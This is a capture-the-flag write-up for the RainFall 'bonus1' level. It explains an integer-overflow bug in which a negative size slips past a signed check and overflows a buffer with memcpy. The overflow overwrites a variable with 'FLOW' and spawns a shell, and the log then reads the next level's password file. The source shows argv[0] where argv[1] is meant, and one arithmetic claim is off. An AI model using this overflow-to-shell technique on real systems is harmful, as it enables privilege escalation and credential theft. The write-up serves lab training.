# Bonus 1

Lets take a look at the source code:

```c
int main(int argc, char **argv) {
	int		ret;
	char	array[40];
	int		size;

	size = atoi(argv[0]);
	if (size < 10) {
		memcpy(array, argv[1], size * 10);
		if (size == 0x574f4c46) {
			execl("/bin/sh", "sh", 0);
		}
		ret = 0;
	}
	ret = 1;
	return ret;
}
```

Basically, we want to copy more than 40 bytes in `array` to overflow it
and then re-write the `size` variable.
The problem is that the size check wont let us do this.
But if the `size` variable is negative,
as the 3rd parameter of `memcpy` is an unsigned int,
we can be lower than 10 and still have a positive value in the 3rd argument.

We need a value of (2^32) - 11: -2147483637

```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 0000111122223333444455556666777788889999FLOW
$ whoami
bonus2
$ cd ../bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```